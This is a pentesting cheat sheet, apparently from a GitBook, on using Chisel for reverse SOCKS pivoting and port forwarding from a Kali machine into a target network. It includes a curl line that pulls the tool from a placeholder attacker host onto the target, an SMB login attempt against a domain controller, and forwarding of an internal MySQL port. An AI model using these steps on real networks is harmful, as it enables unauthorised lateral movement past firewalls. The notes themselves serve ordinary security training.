# Chisel

> Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

#### Pre-Requisites:

* Download the binary to transfer on the target machine:

{% embed url="https://github.com/jpillora/chisel/releases" %}

* Download the package on Kali machine

```bash
sudo apt install chisel
```

* Add chisel port to the proxychains configuration

```bash
sudo nano /etc/proxychains

socks4    127.0.0.1    1080 # <-- add this line
```

Once downloaded and configured them, we can perform both pivoting and port forwarding.



## Pivoting with Chisel

### Start Chisel server

```bash
chisel server --port 8000 -reverse
```

### Connect the target machine to server

Transfer the chisel's binary to the target.

```bash
curl http://ATT_IP:ATT_PORT/chisel_1.10.1_windows_amd64 -o chisel.exe
```

Connect the client to the server with follow command:

```powershell
.\chisel.exe client SERVER_IP:SERVER_PORT R:socks
```

***

Test the tunnel from attack machine

```bash
proxychains ping SECOND_TARGET_IP

proxychains nxc smb DC_IP -u "gg" -p 'ii'
```



## Port Forwarding with Chisel

### Start Chisel server

```bash
chisel server --port 8000 -reverse
```

### Make the port forwarding&#x20;

Transfer the chisel's binary to the target.

```bash
curl http://ATT_IP:ATT_PORT/chisel_1.10.1_windows_amd64 -o chisel.exe
```

Connect the client to the server making the port forwarding with follow command:

{% code title="windows target machine" %}
```powershell
.\chisel.exe client SERVER_IP:SERVER_PORT R:socksR:1235:127.0.0.1:3306
```
{% endcode %}

{% code title="linux target machine" %}
```bash
chmod +x chisel_1.10.1_linux_386
./chisel_1.10.1_linux_386 client SERVER_IP:SERVER_PORT R:1235:127.0.0.1:3306

# R — Reverse mode
# 1235 — Port on which the kali linux machine will be listening for the service
# 127.0.0.1 — IP of the machine you want to access.
# 3306 — This is the well known port, mysql port where the service is running
```
{% endcode %}

***

Test the port forwarded

```bash
sudo mysql -u root --port 1235 -p
```

### Web Port forwarding Chisel

if you want to browse anything on firefox which is hosted on that internal machine. You will have to setup a proxy just like you do for Burp suite. And your browser will be setup.

<figure><img src="../../../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>
